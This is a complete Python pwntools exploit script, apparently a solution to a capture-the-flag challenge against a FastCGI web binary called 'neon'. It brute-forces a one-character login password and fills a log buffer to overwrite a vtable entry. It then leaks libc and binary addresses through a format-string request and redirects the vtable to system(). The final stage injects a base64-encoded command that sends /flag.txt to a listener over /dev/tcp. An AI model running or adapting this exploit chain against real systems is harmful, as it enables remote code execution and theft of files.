#!/usr/bin/env python3

import requests
from pwn import *
from urllib.parse import quote

if args.HOST and not args.LISTEN:
    log.warn("If running against the real challenge, run with `LISTEN=your.public.ip.address`")

LOGS_MAX    = 0x8000 - 2
CRLF        = b'\r\n'

e,libc      = ELF('neon', checksec=False) , ELF('libc/libc.so.6', checksec=False)
session_id  = None

# starting a socket for a connect back
sock        = listen()

# parameters that needs to be set
HOST            = args.HOST or "localhost"
PORT            = args.PORT or "1337"
LISTEN          = args.LISTEN or "172.17.0.1"
URL             = f'http://{HOST}:{PORT}'

CONNECT_BACK    = f'{LISTEN}:{sock.lport}'

RHOST,RPORT     = URL.split('//')[1].split(':')
LHOST,LPORT     = CONNECT_BACK.split(':')

def login(p:str):
    r = requests.post(
        f'{URL}/login',
        data={'password': p}
    )
    if r.cookies.get('session_id',None):
        return r.cookies['session_id']
    else:
        return None

def submit(message:bytes):
    requests.post(
        url     = f'{URL}/submit',
        cookies = {'session_id' : session_id},
        data    = {'message'    : message}
    )
    return

def overflow(vtable_overwrite:bytes , l:pwnlib.log.Progress = None):
    logs_offset = 0
    while logs_offset <= (LOGS_MAX-23):
        len = 1023 % (LOGS_MAX-logs_offset)
        if len - 23 < 0:
            break
        if l: l.status('Filling the logs...'+'.'*(logs_offset//950))
        submit(b'A'*(len-23))
        logs_offset += len
    submit(b'B'*10 +vtable_overwrite)

def url_encode(data : bytes) -> bytes:
    return b''.join([b'%' + hex(i)[2:].zfill(2).encode() for i in data])


# bypass auth - password doesn't change between failed attempts . only binary restarts
if not session_id: 
    with log.progress('Bypassing Auth....\t\t',level=logging.CRITICAL) as l:
        for i in string.printable:
            l.status(i)
            session_id = login(i)
            if session_id:
                l.success(f'Session Acquired -> {session_id}')
                break
        else:
            l.failure('Failed to acquire session id')
            exit(1)
            
idx = 0
with log.progress('Bruteforcing....\t\t',level=logging.CRITICAL) as l:
    while True:
        l.status(f'0x{idx:02x}/0x{2**8:02x}')
        # Overflow
        overflow(p16(e.plt['FCGI_printf']&0xffff),l)

        # Leaks# Leaks - we need some percision here
        req  = b''
        req += b'GET /login:' + url_encode(b'%c'*20 + b'%p,'*20) + b' HTTP/1.1' + CRLF
        req += b'Host: %s:%s'%(RHOST.encode(),RPORT.encode()) + CRLF
        req += b'Cookie: session_id=' + (b'%0d'*8+b'%0a'*8)*2 + CRLF
        req += CRLF

        # l.status('Wishing for leaks...')
        with context.local(log_level = 'CRITICAL'):
            r = remote(RHOST,RPORT)
            r.send(req)

            # here comes the leaks
            r.recvuntil(b'\r\n\r\n') # skip the headers
            leaks       = r.recvall(timeout=1)
            r.close()

        # check if we crached the binary already
        if b'500 Internal Server Error' in leaks:
            continue

        libc_leak   = int(leaks.split(b',')[2],base=16) - 0x2a1ca
        bin_leak    = int(leaks.split(b',')[6],base=16) - 0x2510

        l.status(f"Libc base: {hex(libc_leak)}")

        e.address       = bin_leak
        libc.address    = libc_leak

        # Exploitation . overflow then write system into the vtable
        l.status('Writing System to vtable...')
        sleep(0.5)
        overflow(p64(libc.sym.system)[:6],l)

        command = b64e(f'cat /flag.txt > /dev/tcp/{LHOST}/{LPORT}'.encode())

        r = requests.post(
            url     = f'{URL}/login'+quote(f";echo {command}|base64 -d|bash"),
            cookies = {'session_id' : session_id},
        )

        l.status('Waiting for flag...')
        _ = sock.wait_for_connection()
        x = sock.recvall()

        l.success(x.decode().strip())

        r.close() ; sock.close()
        break
